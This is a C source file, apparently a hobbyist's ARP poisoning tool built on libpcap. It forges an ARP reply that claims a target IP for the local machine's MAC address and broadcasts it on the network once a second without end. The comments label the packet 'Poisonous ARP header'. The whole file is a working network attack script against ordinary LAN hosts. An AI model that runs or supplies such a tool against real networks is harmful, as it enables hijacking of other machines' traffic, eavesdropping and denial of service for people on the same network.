#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>

#include "network_helper.h"
#include "ethernet.h"
#include "arp.h"

/*
 * Ethernet header:
 *	SRC: <hmac>
 *	DST: Broadcast (ff:ff:ff:ff:ff:ff)
 *	Type: 0x806 (ARP)
 *
 * Poisonous ARP header:
 *	HTYPE:	Ethernet (1)
 *	PTYPE:	IP (0x800)
 *	HSIZE:	6
 *	PSIZE:	4
 *	SRC MAC:	<hmac>
 *	SRC IP:		<target ip>
 *	DEST MAC:	Broadcast
 *	DEST IP:	0.0.0.0
 */

void send_packet(struct ether_hdr*);

void error(char *str)
{
	printf("[ERROR]: %s\n", str);
	exit(1);
}

int main(int argc, char **argv)
{
	if(argc != 2)
		error("USAGE: ./arp_poison <TARGET_IP>");

	const char* dev = "eth0";
	unsigned char src_mac[6];
	unsigned char src_ip[4];

	/* Parse and print data */
	parse_ip_address(argv[1], src_ip);
	get_device_network_address(dev, src_mac);

	/*
	printf("ARP ATTACK PLAN:\n--- Source ---\n");
	print_mac(src_mac);
	print_ip(src_ip);
	printf("--- Destination ---\n");
	printf("mac: broadcast ff:ff:ff:ff:ff:ff\n");
	printf("ip: broadcast (0.0.0.0)\n");
	*/

	/* Create headers */
	printf("ARP_HDR_LEN + ETH_HDR_LEN = %d\n", ARP_HDR_LEN + ETHER_HDR_LEN);

	struct ether_hdr* ether_header = (struct ether_hdr*)malloc(ETHER_HDR_LEN
			+ ARP_HDR_LEN);

	struct arp_hdr* arp_header = (struct arp_hdr*)(ether_header+1);//ETHER_HDR_LEN);

	printf("arp_header - ether_header = %d\n", (long)arp_header - (long)ether_header);

	/* Build ethernet header */
	ether_header->ether_type = htons(0x0806); /* ARP EtherType */
	memset(ether_header->ether_dest_addr, 0xff, ETHER_ADDR_LEN);
	memcpy(ether_header->ether_src_addr, src_mac, ETHER_ADDR_LEN);

	/* Build ARP header */
	arp_header->htype = htons(0x01);	/* Ethernet type */
	arp_header->ptype = htons(0x0800);	/* Not really sure... */
	arp_header->hlen = 0x06;		/* Hardware address lenght */
	arp_header->plen = 0x04;		/* IP address lenght */
	arp_header->opcode = htons(ARP_REPLY);	/* OP CODE for reply */

	memcpy(arp_header->sha, src_mac, 6);
	memcpy(arp_header->spa, src_ip, 4);
	memset(arp_header->tha, 0xff, 6);
	memset(arp_header->tpa, 0x00, 4);

	print_ether(ether_header);
	print_arp(arp_header);

	send_packet(ether_header);
	return 0;
}

void send_packet(struct ether_hdr* ether_header)
{
	char errbuf[PCAP_ERRBUF_SIZE];		/* Error message buffer */
	struct bpf_program filter;		/* Filter for pcap	*/
	bpf_u_int32 netaddr=0, mask=0;		/* To store network address
						   and netmask  */

	char *device = pcap_lookupdev(errbuf);
	if(device == NULL)
		error(errbuf);

	printf("Using device: %s\n", device);

	pcap_t* pcap_handle = pcap_open_live(device, 4096, 1, 0, errbuf);
	if(pcap_handle == NULL)
		error(errbuf);

	if(pcap_lookupnet(device, &netaddr, &mask, errbuf) == -1)
		error(errbuf);

	if(pcap_compile(pcap_handle, &filter, "arp", 1, mask) == -1)
		error("-- NO INFO --");

	if(pcap_setfilter(pcap_handle, &filter) == -1)
		error("-- NO INFO --");

	while(1) {
		if(pcap_inject(pcap_handle,(unsigned char*)ether_header,
				   ETHER_HDR_LEN + ARP_HDR_LEN) != ETHER_HDR_LEN
		   +ARP_HDR_LEN)
			error("pcap_sendpacket");
	sleep(1);
	}
}
